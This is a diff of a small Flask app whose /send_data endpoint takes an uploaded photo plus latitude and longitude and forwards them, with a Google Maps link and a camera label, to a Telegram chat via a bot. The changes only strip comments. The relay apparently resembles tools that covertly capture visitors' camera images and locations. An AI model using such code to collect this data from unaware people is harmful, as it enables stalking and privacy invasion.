@@ -1,4 +1,3 @@
-# app.py
 import os
 import tempfile
 from flask import Flask, request, jsonify
@@ -25,13 +24,11 @@ def root():
 @app.route("/send_data", methods=["POST"])
 def send_data():
     try:
-        # Support both JSON (older version) and multipart/form-data (preferred)
-        # If multipart/form-data, request.form/request.files will be used.
+        # Support both JSON and multipart/form-data
         if request.content_type and request.content_type.startswith("application/json"):
             data = request.get_json(force=True)
             lat = data.get("lat")
             lon = data.get("lon")
-            # photo in JSON would be a dataURL; we do not handle that here
             return jsonify({"ok": False, "error": "Please send multipart/form-data with a 'photo' file"}), 400
 
         # multipart/form-data path
@@ -54,11 +51,10 @@ def send_data():
                 TELEGRAM_SENDMESSAGE_URL(),
                 json={"chat_id": CHAT_ID, "text": text_caption}
             )
-            # non-fatal if message fails; we'll still attempt to send photo
         except Exception as e:
             app.logger.warning("Failed to send Telegram message: %s", e)
 
-        # 2) Save photo to a temp file and send it to Telegram
+        # 2) Save photo temporarily and send to Telegram
         tmp_fd, tmp_path = tempfile.mkstemp(suffix=".jpg")
         try:
             with os.fdopen(tmp_fd, "wb") as f:
@@ -68,11 +64,9 @@ def send_data():
                 files = {"photo": (f"{label}.jpg", img_file, "image/jpeg")}
                 data = {"chat_id": CHAT_ID, "caption": f"📷 Photo from {label} camera\nLocation: {maps_link}"}
                 resp = requests.post(TELEGRAM_SENDPHOTO_URL(), data=data, files=files, timeout=60)
-                # check Telegram response for debugging if needed
                 if resp.status_code != 200:
                     app.logger.warning("Telegram sendPhoto failed: %s", resp.text)
         finally:
-            # always remove temp file
             try:
                 os.remove(tmp_path)
             except Exception:
